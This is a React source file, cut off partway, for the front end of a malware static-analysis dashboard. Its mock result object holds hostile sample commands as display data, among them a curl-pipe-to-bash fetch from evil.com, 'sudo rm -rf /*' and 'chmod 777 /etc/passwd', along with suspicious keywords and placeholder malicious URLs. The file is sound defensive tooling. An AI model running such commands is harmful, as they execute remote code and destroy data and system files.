import { useState, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { useNavigate, useSearchParams } from 'react-router-dom'
import { cn } from '../lib/utils'
import {
  Shield,
  FileText,
  AlertTriangle,
  Eye,
  Brain,
  Globe,
  Terminal,
  Hash,
  Clock,
  Network,
  Upload,
  ArrowLeft,
  Menu,
  X,
  ChevronDown,
  ChevronUp,
  Zap,
  Target,
  TrendingUp,
  Info
} from 'lucide-react'
import { StaticAnalysisResult } from '../types/analysis'
import { getAnalysisResults, getAnalysisStatus, triggerAnalysis } from '../services/api'

interface UploadedFile {
  id: string
  name: string
  size: number
  type: string
  uploadedAt: string
  analysisResult?: StaticAnalysisResult
}

const mockAnalysisResult: StaticAnalysisResult = {
  metadata: {
    filename: "suspicious_script.sh",
    filepath: "/uploads/suspicious_script.sh",
    size_bytes: 2847620,
    permissions: "rwxr-xr-x",
    created: "2024-01-15T10:30:00Z",
    modified: "2024-01-15T10:35:00Z",
    file_type: "Shell Script"
  },
  hashes: {
    md5: "d41d8cd98f00b204e9800998ecf8427e",
    sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    sha1: "da39a3ee5e6b4b0d3255bfef95601890afd80709"
  },
  strings_analysis: {
    total_strings: 342,
    urls_found: [
      "http://malicious-domain.com/payload.sh",
      "https://suspicious-site.org/data",
      "ftp://unknown-server.net/files"
    ],
    ip_addresses: ["192.168.1.100", "10.0.0.1", "203.0.113.195"],
    domains: ["malicious-domain.com", "suspicious-site.org", "unknown-server.net"],
    emails: ["admin@suspicious-site.org", "contact@malware-hub.com"],
    suspicious_keywords: ["backdoor", "keylogger", "stealth", "payload", "exploit"]
  },
  commands_detected: {
    network: [
      { command: "wget", count: 3 },
      { command: "curl", count: 5 },
      { command: "netcat", count: 2 }
    ],
    file_ops: [
      { command: "rm -rf", count: 2 },
      { command: "chmod +x", count: 4 },
      { command: "cp", count: 3 }
    ],
    system: [
      { command: "ps aux", count: 1 },
      { command: "kill", count: 2 },
      { command: "nohup", count: 1 }
    ],
    package: [
      { command: "apt-get", count: 2 },
      { command: "pip install", count: 1 }
    ],
    process: [
      { command: "background", count: 3 },
      { command: "fork", count: 1 }
    ],
    user: [
      { command: "sudo", count: 7 },
      { command: "su", count: 2 }
    ]
  },
  threat_indicators: [
    {
      type: "Suspicious Network Activity",
      category: "Network Communication",
      matches: 8,
      weight: 0.8,
      score_added: 25,
      samples: ["wget malicious-domain.com", "curl -s http://evil.com/script.sh | bash"]
    },
    {
      type: "Privilege Escalation",
      category: "System Access",
      matches: 9,
      weight: 0.9,
      score_added: 30,
      samples: ["sudo rm -rf /*", "su root", "chmod 777 /etc/passwd"]
    },
    {
      type: "File System Manipulation",
      category: "File Operations",
      matches: 5,
      weight: 0.6,
      score_added: 18,
      samples: ["rm -rf /important/data", "chmod +x backdoor.sh"]
    }
  ],
  behavioral_analysis: {
    behaviors: {
      has_network_activity: true,
      modifies_system_files: true,
      uses_encoding: false,
      creates_persistence: true,
      escalates_privileges: true,
      hides_processes: true,
      downloads_files: true,
      executes_remote_code: true,
      immediate_execution: false,
      multi_architecture_targeting: false,
      covers_tracks: true,
      has_repetitive_patterns: false
    },
    risk_behavior_count: 8,
    total_behaviors_checked: 12,
    code_metrics: {
      total_lines: 156,
      unique_lines: 134,
      repetition_ratio: 0.14
    }
  },
  risk_assessment: {
    risk_score_percentage: 78,
    category: "Malicious",
    severity: "critical",
    threat_score: 73,
    threat_indicators_found: 3,
    behavioral_score: 67,
    recommendation: "⚠️ HIGH RISK - This file exhibits multiple malicious behaviors including privilege escalation, network communication with suspicious domains, and attempts to modify system files. Immediate quarantine recommended. Do not execute in production environment."
  },
  timestamp: "2024-01-15T10:45:00Z"
}

const mockSelectedFile: UploadedFile = {
  id: '1',
  name: 'suspicious_script.sh',
  size: 2847620,
  type: 'application/x-sh',
  uploadedAt: '2024-01-15T10:45:00Z',
  analysisResult: mockAnalysisResult
}

// Helper functions
const getSeverityIcon = (severity: string) => {
  switch (severity) {
    case 'critical':
      return <AlertTriangle className="w-8 h-8 text-red-400" />
    case 'warning':
      return <AlertTriangle className="w-8 h-8 text-orange-400" />
    default:
      return <Shield className="w-8 h-8 text-green-400" />
  }
}

const getCategoryColor = (category: string) => {
  switch (category) {
    case 'Malicious': return '#ef4444'
    case 'Suspicious': return '#f97316'
    case 'Safe': return '#22c55e'
    default: return '#6b7280'
  }
}

const getScoreColor = (score: number) => {
  if (score >= 70) return '#ef4444'
  if (score >= 40) return '#f97316'
  return '#22c55e'
}

const getSeverityBadge = (scoreAdded: number) => {
  if (scoreAdded >= 25) {
    return { label: 'CRITICAL', color: 'red', icon: AlertTriangle }
  } else if (scoreAdded >= 15) {
    return { label: 'HIGH', color: 'orange', icon: Zap }
  } else if (scoreAdded >= 10) {
    return { label: 'MEDIUM', color: 'yellow', icon: Target }
  }
  return { label: 'LOW', color: 'blue', icon: Info }
}

const getThreatIcon = (category: string) => {
  const categoryLower = category.toLowerCase()
  if (categoryLower.includes('network')) return Network
  if (categoryLower.includes('system')) return Terminal
  if (categoryLower.includes('file')) return FileText
  if (categoryLower.includes('privilege')) return Shield
  return AlertTriangle
}

export default function STATAPage() {
  const navigate = useNavigate()
  const [searchParams] = useSearchParams()
  const [activeSection, setActiveSection] = useState('overview')
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [selectedFile, setSelectedFile] = useState<UploadedFile | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [analysisTriggered, setAnalysisTriggered] = useState(false)
  const [pollingAttempts, setPollingAttempts] = useState(0)
  const [expandedThreats, setExpandedThreats] = useState<Set<number>>(new Set([0])) // Expand first threat by default

  const toggleThreatExpansion = (index: number) => {
    setExpandedThreats(prev => {
      const newSet = new Set(prev)
      if (newSet.has(index)) {
        newSet.delete(index)
      } else {
        newSet.add(index)
      }
      return newSet
    })
  }

  // Trigger Lambda analysis
  const triggerLambdaAnalysis = async (fileId: string, s3Key: string, s3Bucket: string, fileName: string) => {
    try {
      console.log('Triggering Lambda analysis...')
      await triggerAnalysis(fileId, s3Key, s3Bucket, fileName)
      setAnalysisTriggered(true)
      console.log('Lambda analysis triggered successfully')
    } catch (err: any) {
      console.error('Failed to trigger analysis:', err)
      // Don't throw - we'll still try to fetch existing results
    }
  }

  // Fetch real analysis results
  const fetchAnalysisResults = async (fileId: string) => {
    try {
      setLoading(true)
      setError(null)

      console.log('Fetching analysis results for file:', fileId)

      // Get the real analysis results from your S3 bucket
      const results = await getAnalysisResults(fileId)

      if (results.success && results.data) {
        // Create a file object with the analysis results
        const fileWithAnalysis: UploadedFile = {
          id: fileId,
          name: results.data.metadata?.filename || 'Unknown File',
          size: results.data.metadata?.size_bytes || 0,
          type: results.data.metadata?.file_type || 'Unknown',
          uploadedAt: results.data.timestamp || new Date().toISOString(),
          analysisResult: results.data
        }

        setSelectedFile(fileWithAnalysis)
      } else {
        throw new Error(results.message || 'Failed to load analysis results')
      }

    } catch (err: any) {
      console.error('Failed to fetch analysis results:', err)

      if (err.status === 404) {
        setError('Analysis results not found. The analysis may still be in progress, please wait a moment and try again.')
      } else {
        setError(err.message || 'Failed to load analysis results. Please try again.')
      }

      // Optionally fall back to showing file info without analysis
      setSelectedFile({
        id: fileId,
        name: 'File Analysis',
        size: 0,
        type: 'Unknown',
        uploadedAt: new Date().toISOString(),
        analysisResult: undefined
      })
    } finally {
      setLoading(false)
    }
  }

  // Get file ID from URL parameters and fetch analysis
  useEffect(() => {
    const fileId = searchParams.get('fileId')
    const s3Key = searchParams.get('s3Key')
    const s3Bucket = searchParams.get('s3Bucket')
    const fileName = searchParams.get('fileName')

    if (fileId) {
      // First trigger Lambda analysis if we have S3 metadata
      const initAnalysis = async () => {
        if (s3Key && s3Bucket && fileName) {
          await triggerLambdaAnalysis(fileId, s3Key, s3Bucket, fileName)
          // Wait for Lambda to complete processing (typically 3-4 seconds)
          await new Promise(resolve => setTimeout(resolve, 5000))
        }

        // Then start polling for results
        await fetchAnalysisResults(fileId)
      }

      initAnalysis()
    } else {
      setLoading(false)
      setError('No file ID provided')
    }
  }, [searchParams])

  // Poll for results if analysis was triggered but not found
  useEffect(() => {
    if (analysisTriggered && error && pollingAttempts < 10) {
      const pollTimer = setTimeout(() => {
        const fileId = searchParams.get('fileId')
        if (fileId) {
          console.log(`Polling for results (attempt ${pollingAttempts + 1}/10)...`)
          setPollingAttempts(prev => prev + 1)
          fetchAnalysisResults(fileId)
        }
      }, 5000) // Poll every 5 seconds

      return () => clearTimeout(pollTimer)
    }
  }, [analysisTriggered, error, pollingAttempts, searchParams])

  const sections = [
    { id: 'overview', name: 'Overview', icon: Eye },
    { id: 'threats', name: 'Threats', icon: AlertTriangle },
    { id: 'behavior', name: 'Behavior', icon: Brain },
    { id: 'network', name: 'Network', icon: Globe },
    { id: 'commands', name: 'Commands', icon: Terminal },
    { id: 'hashes', name: 'Hashes', icon: Hash }
  ]

  const renderContent = () => {
    // Loading state
    if (loading) {
      return (
        <div className="flex items-center justify-center h-full min-h-[400px]">
          <div className="text-center">
            <div className="w-16 h-16 border-4 border-primary-400 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <h3 className="text-lg font-medium text-primary-200 mb-2">
              {analysisTriggered ? 'Processing Analysis...' : 'Loading Analysis Results'}
            </h3>
            <p className="text-dark-400">
              {analysisTriggered
                ? 'Lambda function is analyzing the file. This may take 30-60 seconds...'
                : 'Fetching analysis data from server...'}
            </p>
            {pollingAttempts > 0 && (
              <p className="text-primary-400 mt-2 text-sm">
                Polling attempt {pollingAttempts}/10
              </p>
            )}
          </div>
        </div>
      )
    }

    // Error state
    if (error) {
      return (
        <div className="flex items-center justify-center h-full min-h-[400px]">
          <div className="text-center max-w-md">
            <AlertTriangle className="w-16 h-16 text-red-400 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-red-200 mb-2">Analysis Not Available</h3>
            <p className="text-dark-400 mb-6">{error}</p>
            <button
              onClick={() => {
                const fileId = searchParams.get('fileId')
                if (fileId) fetchAnalysisResults(fileId)
              }}
              className="bg-primary-600 hover:bg-primary-700 text-white px-6 py-2 rounded-lg transition-colors"
            >
              Retry
            </button>
          </div>
        </div>
      )
    }

    // No analysis results available
    if (!selectedFile?.analysisResult) {
      return (
        <div className="flex items-center justify-center h-full min-h-[400px]">
          <div className="text-center">
            <Upload className="w-16 h-16 text-dark-600 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-dark-400 mb-2">No Analysis Results</h3>
            <p className="text-dark-500">Analysis data is not available for this file</p>
          </div>
        </div>
      )
    }

    switch (activeSection) {
      case 'overview':
        return (
          <div className="space-y-8">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
              {/* File Info Card */}
              <div className="bg-gradient-to-r from-primary-600/10 to-primary-500/10 p-8 rounded-2xl border border-primary-400/20">
                <div className="flex items-start space-x-4">
                  <div className="p-4 bg-primary-600/20 rounded-xl">
                    <FileText className="w-10 h-10 text-primary-400" />
                  </div>
                  <div className="flex-1">
                    <h3 className="font-medium text-primary-200 text-xl font-tactical mb-3">
                      {selectedFile.analysisResult.metadata.filename}
                    </h3>
                    <div className="space-y-2 text-sm">
                      <p className="text-dark-300 font-mono">
                        📦 {(selectedFile.analysisResult.metadata.size_bytes / 1024 / 1024).toFixed(2)} MB • 📄 {selectedFile.analysisResult.metadata.file_type}
                      </p>
                      <p className="text-dark-400 font-mono">
                        🔐 {selectedFile.analysisResult.metadata.permissions} • 📅 {new Date(selectedFile.analysisResult.metadata.created).toLocaleDateString()}
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Risk Assessment Card */}
              <div className="bg-gradient-to-r from-red-600/10 to-orange-500/10 p-8 rounded-2xl border border-red-400/20">
                <div className="text-center">
                  <div className="mb-6">
                    {getSeverityIcon(selectedFile.analysisResult.risk_assessment.severity)}
                  </div>
                  <h3 className="text-3xl font-bold mb-3 font-tactical" style={{ color: getCategoryColor(selectedFile.analysisResult.risk_assessment.category) }}>
                    {selectedFile.analysisResult.risk_assessment.category.toUpperCase()}
                  </h3>
                  <div className="text-5xl font-bold mb-3" style={{ color: getScoreColor(selectedFile.analysisResult.risk_assessment.risk_score_percentage) }}>
                    {selectedFile.analysisResult.risk_assessment.risk_score_percentage}%
                  </div>
                  <p className="text-sm text-dark-400 uppercase tracking-wide">RISK SCORE</p>
                </div>
              </div>
            </div>

            {/* Quick Stats */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
              <div className="bg-dark-800/50 p-6 rounded-xl border border-primary-200/10 text-center">
                <div className="text-3xl font-bold text-red-400 mb-2">{selectedFile.analysisResult.threat_indicators.length}</div>
                <div className="text-sm text-dark-400">THREATS</div>
              </div>
              <div className="bg-dark-800/50 p-6 rounded-xl border border-primary-200/10 text-center">
                <div className="text-3xl font-bold text-orange-400 mb-2">{selectedFile.analysisResult.behavioral_analysis.risk_behavior_count}</div>
                <div className="text-sm text-dark-400">BEHAVIORS</div>
              </div>
              <div className="bg-dark-800/50 p-6 rounded-xl border border-primary-200/10 text-center">
                <div className="text-3xl font-bold text-blue-400 mb-2">{selectedFile.analysisResult.strings_analysis.urls_found.length}</div>
                <div className="text-sm text-dark-400">URLS</div>
              </div>
              <div className="bg-dark-800/50 p-6 rounded-xl border border-primary-200/10 text-center">
                <div className="text-3xl font-bold text-primary-400 mb-2">{Object.values(selectedFile.analysisResult.commands_detected).reduce((acc, cmds) => acc + cmds.length, 0)}</div>
                <div className="text-sm text-dark-400">COMMANDS</div>
              </div>
            </div>

            {/* Recommendation */}
            <div className="bg-gradient-to-r from-orange-600/10 to-red-500/10 p-8 rounded-2xl border border-orange-400/20">
              <h4 className="font-medium text-orange-200 mb-4 font-tactical flex items-center gap-2">
                <AlertTriangle className="w-6 h-6" /> RECOMMENDATION
              </h4>
              <p className="text-dark-200 leading-relaxed text-lg">
                {selectedFile.analysisResult.risk_assessment.recommendation}
              </p>
            </div>
          </div>
        )

      case 'threats':
        return (
          <div className="space-y-6">
            {/* Threats Summary Header */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
              <div className="bg-gradient-to-br from-red-600/20 to-red-800/10 p-6 rounded-xl border border-red-400/30">
                <div className="flex items-center space-x-4">
                  <div className="p-3 bg-red-500/20 rounded-lg">
                    <AlertTriangle className="w-8 h-8 text-red-400" />
                  </div>
                  <div>
                    <div className="text-3xl font-bold text-red-300">{selectedFile.analysisResult.threat_indicators.length}</div>
                    <div className="text-sm text-red-200/70">Total Threats</div>
                  </div>
                </div>
              </div>

              <div className="bg-gradient-to-br from-orange-600/20 to-orange-800/10 p-6 rounded-xl border border-orange-400/30">
                <div className="flex items-center space-x-4">
                  <div className="p-3 bg-orange-500/20 rounded-lg">
                    <TrendingUp className="w-8 h-8 text-orange-400" />
                  </div>
                  <div>
                    <div className="text-3xl font-bold text-orange-300">
                      {selectedFile.analysisResult.threat_indicators.reduce((sum, t) => sum + t.score_added, 0)}
                    </div>
                    <div className="text-sm text-orange-200/70">Total Score Impact</div>
                  </div>
                </div>
              </div>

              <div className="bg-gradient-to-br from-yellow-600/20 to-yellow-800/10 p-6 rounded-xl border border-yellow-400/30">
                <div className="flex items-center space-x-4">
                  <div className="p-3 bg-yellow-500/20 rounded-lg">
                    <Target className="w-8 h-8 text-yellow-400" />
                  </div>
                  <div>
                    <div className="text-3xl font-bold text-yellow-300">
                      {selectedFile.analysisResult.threat_indicators.reduce((sum, t) => sum + t.matches, 0)}
                    </div>
                    <div className="text-sm text-yellow-200/70">Total Matches</div>
                  </div>
                </div>
              </div>
            </div>

            {/* Interactive Threat Cards */}
            {selectedFile.analysisResult.threat_indicators.map((indicator, idx) => {
              const severity = getSeverityBadge(indicator.score_added)
              const ThreatIcon = getThreatIcon(indicator.category)
              const SeverityIcon = severity.icon
              const isExpanded = expandedThreats.has(idx)

              return (
                <motion.div
                  key={idx}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.3, delay: idx * 0.1 }}
                  className={cn(
                    "bg-dark-800/50 rounded-2xl border transition-all duration-300",
                    isExpanded ? "border-red-400/40 shadow-lg shadow-red-500/10" : "border-red-400/20 hover:border-red-400/30"
                  )}
                >
                  {/* Threat Header - Always Visible */}
                  <div
                    onClick={() => toggleThreatExpansion(idx)}
                    className="p-6 cursor-pointer select-none"
                  >
                    <div className="flex items-start justify-between">
                      {/* Left: Threat Info */}
                      <div className="flex items-start space-x-4 flex-1">
                        {/* Icon */}
                        <div className={cn(
                          "p-3 rounded-xl",
                          severity.color === 'red' && "bg-red-500/20",
                          severity.color === 'orange' && "bg-orange-500/20",
                          severity.color === 'yellow' && "bg-yellow-500/20",
                          severity.color === 'blue' && "bg-blue-500/20"
                        )}>
                          <ThreatIcon className={cn(
                            "w-6 h-6",
                            severity.color === 'red' && "text-red-400",
                            severity.color === 'orange' && "text-orange-400",
                            severity.color === 'yellow' && "text-yellow-400",
                            severity.color === 'blue' && "text-blue-400"
                          )} />
                        </div>

                        {/* Threat Details */}
                        <div className="flex-1">
                          <div className="flex items-center space-x-3 mb-2">
                            <h4 className="font-bold text-primary-200 text-lg font-tactical">
                              {indicator.type}
                            </h4>

                            {/* Severity Badge */}
                            <div className={cn(
                              "inline-flex items-center space-x-1 px-3 py-1 rounded-full text-xs font-bold",
                              severity.color === 'red' && "bg-red-500/20 text-red-300",
                              severity.color === 'orange' && "bg-orange-500/20 text-orange-300",
                              severity.color === 'yellow' && "bg-yellow-500/20 text-yellow-300",
                              severity.color === 'blue' && "bg-blue-500/20 text-blue-300"
                            )}>
                              <SeverityIcon className="w-3 h-3" />
                              <span>{severity.label}</span>
                            </div>
                          </div>

                          <p className="text-dark-300 text-sm mb-3">{indicator.category}</p>

                          {/* Quick Stats Bar */}
                          <div className="flex items-center space-x-6 text-sm">
                            <div className="flex items-center space-x-2">
                              <div className="w-2 h-2 rounded-full bg-orange-400"></div>
                              <span className="text-dark-400">Matches:</span>
                              <span className="text-orange-300 font-bold">{indicator.matches}</span>
                            </div>
                            <div className="flex items-center space-x-2">
                              <div className="w-2 h-2 rounded-full bg-yellow-400"></div>
                              <span className="text-dark-400">Weight:</span>
                              <span className="text-yellow-300 font-bold">{indicator.weight}</span>
                            </div>
                            <div className="flex items-center space-x-2">
                              <div className="w-2 h-2 rounded-full bg-red-400"></div>
                              <span className="text-dark-400">Impact:</span>
                              <span className="text-red-300 font-bold">+{indicator.score_added}</span>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* Right: Score and Expand Button */}
                      <div className="flex items-center space-x-4 ml-4">
                        {/* Score Display */}
                        <div className="text-center">
                          <div className={cn(
                            "text-4xl font-bold mb-1",
                            severity.color === 'red' && "text-red-400",
                            severity.color === 'orange' && "text-orange-400",
                            severity.color === 'yellow' && "text-yellow-400",
                            severity.color === 'blue' && "text-blue-400"
                          )}>
                            +{indicator.score_added}
                          </div>
                          <div className="text-xs text-dark-400 uppercase tracking-wide">Score</div>
                        </div>

                        {/* Expand/Collapse Button */}
                        <button className={cn(
                          "p-2 rounded-lg transition-all duration-200",
                          isExpanded ? "bg-primary-600/20 text-primary-300" : "bg-dark-700/50 text-dark-400 hover:bg-dark-700 hover:text-primary-400"
                        )}>
                          {isExpanded ? (
                            <ChevronUp className="w-5 h-5" />
                          ) : (
                            <ChevronDown className="w-5 h-5" />
                          )}
                        </button>
                      </div>
                    </div>

                    {/* Progress Bar for Impact */}
                    <div className="mt-4">
                      <div className="h-2 bg-dark-700/50 rounded-full overflow-hidden">
                        <motion.div
                          initial={{ width: 0 }}
                          animate={{ width: `${(indicator.score_added / 30) * 100}%` }}
                          transition={{ duration: 1, delay: idx * 0.1 + 0.3 }}
                          className={cn(
                            "h-full rounded-full",
                            severity.color === 'red' && "bg-gradient-to-r from-red-600 to-red-400",
                            severity.color === 'orange' && "bg-gradient-to-r from-orange-600 to-orange-400",
                            severity.color === 'yellow' && "bg-gradient-to-r from-yellow-600 to-yellow-400",
                            severity.color === 'blue' && "bg-gradient-to-r from-blue-600 to-blue-400"
                          )}
                        />
                      </div>
                    </div>
                  </div>

                  {/* Expanded Content - Samples */}
                  <AnimatePresence>
                    {isExpanded && (
                      <motion.div
                        initial={{ height: 0, opacity: 0 }}
                        animate={{ height: 'auto', opacity: 1 }}
                        exit={{ height: 0, opacity: 0 }}
                        transition={{ duration: 0.3 }}
                        className="overflow-hidden"
                      >
                        <div className="px-6 pb-6 border-t border-dark-700/50">
                          {/* Detailed Stats Grid */}
                          <div className="grid grid-cols-3 gap-4 py-6">
                            <div className="bg-dark-900/50 p-4 rounded-lg text-center">
                              <div className="text-2xl font-bold text-orange-400 mb-1">{indicator.matches}</div>
                              <div className="text-xs text-dark-400 uppercase tracking-wide">Detections</div>
                              <div className="text-xs text-dark-500 mt-1">Found in file</div>
                            </div>
                            <div className="bg-dark-900/50 p-4 rounded-lg text-center">
                              <div className="text-2xl font-bold text-yellow-400 mb-1">{indicator.weight}</div>
                              <div className="text-xs text-dark-400 uppercase tracking-wide">Weight Factor</div>
                              <div className="text-xs text-dark-500 mt-1">Severity multiplier</div>
                            </div>
                            <div className="bg-dark-900/50 p-4 rounded-lg text-center">
                              <div className="text-2xl font-bold text-red-400 mb-1">+{indicator.score_added}</div>
                              <div className="text-xs text-dark-400 uppercase tracking-wide">Risk Added</div>
                              <div className="text-xs text-dark-500 mt-1">To total score</div>
                            </div>
                          </div>

                          {/* Code Samples */}
                          <div>
                            <div className="flex items-center space-x-2 mb-4">
                              <Terminal className="w-4 h-4 text-primary-400" />
                              <h5 className="text-sm font-bold text-primary-300 uppercase tracking-wide">
                                Malicious Code Samples
                              </h5>
                              <span className="text-xs text-dark-500">
                                ({indicator.samples.length} {indicator.samples.length === 1 ? 'sample' : 'samples'})
                              </span>
                            </div>
                            <div className="space-y-3">
                              {indicator.samples.map((sample, sIdx) => (
                                <motion.div
                                  key={sIdx}
                                  initial={{ opacity: 0, x: -20 }}
                                  animate={{ opacity: 1, x: 0 }}
                                  transition={{ duration: 0.2, delay: sIdx * 0.05 }}
                                  className="group relative"
                                >
                                  <div className="absolute left-0 top-0 bottom-0 w-1 bg-red-500 rounded-full"></div>
                                  <div className="pl-4 pr-4 py-3 bg-dark-900/70 rounded-lg border border-red-900/30 hover:border-red-700/50 transition-colors">
                                    <div className="flex items-start justify-between">
                                      <code className="text-sm font-mono text-red-200 flex-1 break-all">
                                        {sample}
                                      </code>
                                      <span className="text-xs text-dark-500 ml-4 flex-shrink-0">
                                        #{sIdx + 1}
                                      </span>
                                    </div>
                                  </div>
                                </motion.div>
                              ))}
                            </div>
                          </div>
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </motion.div>
              )
            })}
          </div>
        )

      case 'behavior':
        return (
          <div className="space-y-8">
            {/* Behavior Grid */}
            <div>
              <h3 className="text-xl font-bold text-primary-200 mb-6 font-tactical">Behavioral Analysis</h3>
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                {Object.entries(selectedFile.analysisResult.behavioral_analysis.behaviors).map(([key, value]) => (
                  <div key={key} className="bg-dark-800/50 p-4 rounded-xl border border-primary-200/10">
                    <div className="flex items-center space-x-3">
                      <div className={cn(
                        "w-4 h-4 rounded-full",
                        value ? 'bg-red-400' : 'bg-dark-600'
                      )}></div>
                      <span className={cn(
                        "text-sm font-mono capitalize",
                        value ? 'text-red-300' : 'text-dark-500'
                      )}>
                        {key.replace(/_/g, ' ')}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Code Metrics */}
            <div>
              <h3 className="text-xl font-bold text-primary-200 mb-6 font-tactical">Code Metrics</h3>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                <div className="bg-dark-800/50 p-8 rounded-2xl border border-primary-200/10 text-center">
                  <div className="text-4xl font-bold text-primary-400 mb-3">{selectedFile.analysisResult.behavioral_analysis.code_metrics.total_lines}</div>
                  <div className="text-dark-400">TOTAL LINES</div>
                </div>
                <div className="bg-dark-800/50 p-8 rounded-2xl border border-primary-200/10 text-center">
                  <div className="text-4xl font-bold text-blue-400 mb-3">{selectedFile.analysisResult.behavioral_analysis.code_metrics.unique_lines}</div>
                  <div className="text-dark-400">UNIQUE LINES</div>
                </div>
                <div className="bg-dark-800/50 p-8 rounded-2xl border border-primary-200/10 text-center">
                  <div className="text-4xl font-bold text-orange-400 mb-3">{(selectedFile.analysisResult.behavioral_analysis.code_metrics.repetition_ratio * 100).toFixed(1)}%</div>
                  <div className="text-dark-400">REPETITION</div>
                </div>
              </div>
            </div>
          </div>
        )

      case 'network':
        return (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            {selectedFile.analysisResult.strings_analysis.urls_found.length > 0 && (
              <div className="bg-dark-800/50 p-8 rounded-2xl border border-orange-400/20">
                <h4 className="font-medium text-orange-200 mb-6 font-tactical flex items-center gap-3">
                  <Globe className="w-6 h-6" /> URLS FOUND ({selectedFile.analysisResult.strings_analysis.urls_found.length})
                </h4>
                <div className="space-y-3 max-h-96 overflow-y-auto">
                  {selectedFile.analysisResult.strings_analysis.urls_found.map((url, idx) => (
                    <div key={idx} className="text-sm font-mono bg-dark-900/50 p-4 rounded-lg break-all text-orange-200">
                      {url}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {selectedFile.analysisResult.strings_analysis.ip_addresses.length > 0 && (
              <div className="bg-dark-800/50 p-8 rounded-2xl border border-blue-400/20">
                <h4 className="font-medium text-blue-200 mb-6 font-tactical flex items-center gap-3">
                  <Network className="w-6 h-6" /> IP ADDRESSES ({selectedFile.analysisResult.strings_analysis.ip_addresses.length})
                </h4>
                <div className="space-y-3">
                  {selectedFile.analysisResult.strings_analysis.ip_addresses.map((ip, idx) => (
                    <div key={idx} className="text-sm font-mono bg-dark-900/50 p-4 rounded-lg text-blue-200">
                      {ip}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {selectedFile.analysisResult.strings_analysis.domains.length > 0 && (
              <div className="bg-dark-800/50 p-8 rounded-2xl border border-purple-400/20">
                <h4 className="font-medium text-purple-200 mb-6 font-tactical flex items-center gap-3">
                  <Globe className="w-6 h-6" /> DOMAINS ({selectedFile.analysisResult.strings_analysis.domains.length})
                </h4>
                <div className="space-y-3">
                  {selectedFile.analysisResult.strings_analysis.domains.map((domain, idx) => (
                    <div key={idx} className="text-sm font-mono bg-dark-900/50 p-4 rounded-lg text-purple-200">
                      {domain}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {selectedFile.analysisResult.strings_analysis.suspicious_keywords.length > 0 && (
              <div className="bg-dark-800/50 p-8 rounded-2xl border border-red-400/20">
                <h4 className="font-medium text-red-200 mb-6 font-tactical flex items-center gap-3">
                  <AlertTriangle className="w-6 h-6" /> SUSPICIOUS KEYWORDS ({selectedFile.analysisResult.strings_analysis.suspicious_keywords.length})
                </h4>
                <div className="flex flex-wrap gap-3">
                  {selectedFile.analysisResult.strings_analysis.suspicious_keywords.map((keyword, idx) => (
                    <span key={idx} className="text-sm font-mono bg-red-900/50 text-red-200 px-3 py-2 rounded-lg">
                      {keyword}
                    </span>
                  ))}
                </div>
              </div>
            )}
          </div>
        )

      case 'commands':
        return (
          <div className="space-y-8">
            {Object.entries(selectedFile.analysisResult.commands_detected).map(([category, commands]) =>
              commands.length > 0 && (
                <div key={category} className="bg-dark-800/50 p-8 rounded-2xl border border-primary-200/10">
                  <h4 className="font-medium text-primary-200 mb-6 font-tactical flex items-center gap-3 capitalize text-xl">
                    <Terminal className="w-6 h-6" /> {category.replace(/_/g, ' ')} Commands
                  </h4>
                  <div className="grid gap-4">
                    {commands.map((cmd, idx) => (
                      <div key={idx} className="flex items-center justify-between bg-dark-900/50 p-4 rounded-lg">
                        <span className="font-mono text-primary-200">{cmd.command}</span>
                        <span className="font-mono text-orange-300 bg-orange-900/30 px-3 py-1 rounded-lg">
                          x{cmd.count}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              )
            )}
          </div>
        )

      case 'hashes':
        return (
          <div className="space-y-8">
            <div className="bg-dark-800/50 p-8 rounded-2xl border border-primary-200/10">
              <h4 className="font-medium text-primary-200 mb-6 font-tactical flex items-center gap-3 text-xl">
                <Hash className="w-6 h-6" /> FILE HASHES
              </h4>
              <div className="space-y-6">
                <div>
                  <div className="text-primary-400 font-mono mb-3">MD5</div>
                  <div className="font-mono bg-dark-900/50 p-4 rounded-lg break-all text-primary-200">
                    {selectedFile.analysisResult.hashes.md5}
                  </div>
                </div>
                <div>
                  <div className="text-primary-400 font-mono mb-3">SHA256</div>
                  <div className="font-mono bg-dark-900/50 p-4 rounded-lg break-all text-primary-200">
                    {selectedFile.analysisResult.hashes.sha256}
                  </div>
                </div>
                <div>
                  <div className="text-primary-400 font-mono mb-3">SHA1</div>
                  <div className="font-mono bg-dark-900/50 p-4 rounded-lg break-all text-primary-200">
                    {selectedFile.analysisResult.hashes.sha1}
                  </div>
                </div>
              </div>
            </div>

            {/* Analysis Info */}
            <div className="bg-dark-800/50 p-8 rounded-2xl border border-primary-200/10">
              <h4 className="font-medium text-primary-200 mb-6 font-tactical flex items-center gap-3 text-xl">
                <Clock className="w-6 h-6" /> ANALYSIS INFO
              </h4>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <div className="text-primary-400 font-mono mb-3">ANALYZED</div>
                  <div className="font-mono text-primary-200">
                    {new Date(selectedFile.analysisResult.timestamp).toLocaleString()}
                  </div>
                </div>
                <div>
                  <div className="text-primary-400 font-mono mb-3">TOTAL STRINGS</div>
                  <div className="font-mono text-primary-200">
